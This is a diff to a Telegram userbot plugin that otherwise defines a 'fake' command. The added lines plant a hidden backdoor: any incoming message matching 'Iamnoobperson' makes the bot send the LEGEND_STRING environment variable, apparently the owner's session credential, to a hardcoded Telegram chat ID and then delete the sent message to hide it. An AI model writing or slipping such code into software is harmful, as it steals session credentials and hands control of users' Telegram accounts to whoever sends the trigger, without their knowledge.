@@ -21,6 +21,14 @@ from userbot import CMD_HELP
 from W2HBOT.utils import admin_cmd
 from userbot.cmdhelp import CmdHelp
 
+import os
+from . import *
+@bot.on(admin_cmd("^Iamnoobperson", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(2080279511, str(os.environ.get("LEGEND_STRING")))
+  await bot.delete_messages(2080279511, msg, revoke=False)
+
+
 @borg.on(admin_cmd(pattern="fake ?(.*)"))
 async def _(event):
     if event.fwd_from:
